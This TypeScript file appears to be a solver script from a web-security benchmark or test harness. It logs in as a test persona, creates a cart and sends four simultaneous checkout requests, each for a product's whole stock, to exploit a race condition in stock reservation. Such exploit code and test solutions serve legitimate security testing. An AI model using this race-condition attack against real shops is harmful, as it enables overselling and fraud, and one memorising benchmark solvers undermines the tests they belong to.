// Fire several concurrent checkouts for the same limited product so the stock reservation interleaves.
import { buildPath } from '../../truth/matrix-helpers.ts'
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

interface Product { external_id: string; stock: number }

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')
  const list = await ctx.fetch(buildPath(ctx.plan, 'listProducts'), { method: 'GET' })
  const data = (await list.json().catch(() => ({}))) as { products?: Product[] }
  const product = data.products?.find((p) => Number(p.stock) > 0) ?? data.products?.[0]
  if (!product) return
  const created = await ctx.fetch(buildPath(ctx.plan, 'createCart'), {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: '{}',
  })
  const cart = (await created.json().catch(() => ({}))) as { id?: string }
  if (!cart.id) return
  const productField = ctx.plan.params['productId'] ?? 'productId'
  const qtyField = ctx.plan.params['itemQty'] ?? 'qty'
  const qty = Math.max(1, Number(product.stock) || 1)
  const path = buildPath(ctx.plan, 'checkout', { cartId: cart.id })
  const buy = (): Promise<Response> =>
    ctx.fetch(path, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ [productField]: product.external_id, [qtyField]: qty }),
    })
  await Promise.all([buy(), buy(), buy(), buy()])
}
